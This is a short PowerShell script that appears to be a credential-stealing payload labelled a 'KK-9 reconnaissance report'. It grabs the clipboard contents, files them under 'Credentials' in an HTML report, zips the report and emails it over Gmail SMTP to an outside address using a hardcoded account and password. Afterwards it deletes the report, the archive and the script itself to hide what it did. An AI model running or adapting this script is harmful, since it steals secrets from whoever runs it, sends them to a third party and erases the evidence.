$folderDateTime = (get-date).ToString('d-M-y HHmmss')
$userDir = (Get-ChildItem env:\userprofile).value + '\kk-9 Report ' + $folderDateTime
$fileSaveDir = New-Item  ($userDir) -ItemType Directory 
$date = get-date 
$Report = ConvertTo-Html -Title 'Recon Report' -Head $style > $fileSaveDir'/ComputerInfo.html' 
$Report = $Report + "<div id=body><h1>KK-9 Report</h1><hr size=2><br><h3> Generated on: $Date </h3><br>" 
$N1NJA = Get-Clipboard
$Report = $Report  + "<div id=left><h3>Computer Information</h3><br><table><tr><td>Credentials</td><td>$N1NJA</td></tr></table></div>"  
$Report >> $fileSaveDir'/ComputerInfo.html' 
function copy-ToZip($fileSaveDir){ 
$srcdir = $fileSaveDir 
$zipFile = 'C:\Windows\Report.zip'
if(-not (test-path($zipFile))) { 
set-content $zipFile ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18)) 
(dir $zipFile).IsReadOnly = $false} 
$shellApplication = new-object -com shell.application 
$zipPackage = $shellApplication.NameSpace($zipFile) 
$files = Get-ChildItem -Path $srcdir 
foreach($file in $files) { 
$zipPackage.CopyHere($file.FullName) 
while($zipPackage.Items().Item($file.name) -eq $null){ 
Start-sleep -seconds 1 }}} 
copy-ToZip($fileSaveDir) 
try {
$Sender = 'Diego.Arbiter.33@gmail.com'
$Recipient = 'tw1stsargent@gmail.com'
$pass = ConvertTo-SecureString 'Sargent9' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential($sender.Split("@")[0], $pass)
Send-MailMessage -From $Sender -To $Recipient -Subject "KK-9 Report" -Body "Please find attached the KK-9 reconnaissance report." -SmtpServer "smtp.gmail.com" -UseSSL -credential $creds -Attachments "C:\Windows\Report.zip"}
catch {
break }
remove-item $fileSaveDir -recurse 
remove-item 'C:\Windows\Report.zip'
Remove-Item $MyINvocation.InvocationName 